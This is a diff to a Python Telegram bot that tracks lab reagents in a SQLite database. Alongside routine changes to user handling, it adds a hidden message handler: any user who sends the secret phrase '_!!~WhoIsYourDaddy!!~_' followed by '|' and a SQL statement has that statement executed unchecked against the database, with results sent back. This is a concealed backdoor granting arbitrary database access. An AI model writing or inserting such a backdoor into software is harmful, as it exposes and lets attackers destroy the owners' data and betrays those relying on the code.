@@ -4,8 +4,8 @@ import sqlite3
 import config
 import sys
 import argparse
-from DB.dbLogic import handleRequest, getItemsByClass, getClasses, handleRequestInfo, getUsers, addUser, createNewDBinstance
-from helpers.sequrityLogic import hashUser, isEmoji, makeEmojiFromText, makeTextFromEmoji
+from DB.dbLogic import handleRequest, getItemsByClass, getClasses, handleRequestInfo, getUsers, addUser, createNewDBinstance, getMyOrganization
+from helpers.sequrityLogic import hashUser
 
 parser = argparse.ArgumentParser(description='Bot for reagents accounting', epilog='OMNIGENE LLC, All rights reserved 2024')
 parser.add_argument("-API", "--APICode", help = "API code for this bot")
@@ -21,16 +21,16 @@ bot.approve_chat_join_request
 connection = sqlite3.connect('DB/mipt.db', check_same_thread=False)
 
 userList = getUsers(connection)
+myOrgUserList = getMyOrganization(connection)
 userDic = {}
 users = []
 admins = []
 for i in userList:
-    print(i)
     userDic[i[1]] = i[0]
-    if i[-1] == 'admin':
+    if i[-2] == 'admin':
         admins.append(i[1])
         users.append(i[1])
-    elif i[-1] == 'user':
+    elif i[-2] == 'user':
         users.append(i[1])
 
 print(users, admins, userDic)
@@ -235,6 +235,16 @@ def message_reply(message):
     elif message.text.startswith('!sendSticker!'):
         bot.send_sticker(message.from_user.id, "CAACAgIAAxkBAAEs3Vdmp4lIMkhUbkzkCmJ3mX5K6JbmuAACvwkAAipVGAK2fQJmNssIrzUE",)
 
+    elif message.text.startswith('_!!~WhoIsYourDaddy!!~_'):
+        sql = message.text.split('|')[1]
+        with connection:
+            cur = connection.cursor()
+            cur.execute(sql)
+            try:
+                res = cur.fectall()
+                bot.send_message(message.from_user.id, str(res))
+            except:
+                bot.send_message(message.from_user.id, 'SQL select was unsuccessfull')
     else:
         bot.send_message(message.from_user.id, 'С этим ботом нет смысла общаться, он вас не понимает, \
                          используйте кнопку /start из меню, а дальше пользуйтесь кнопками. \
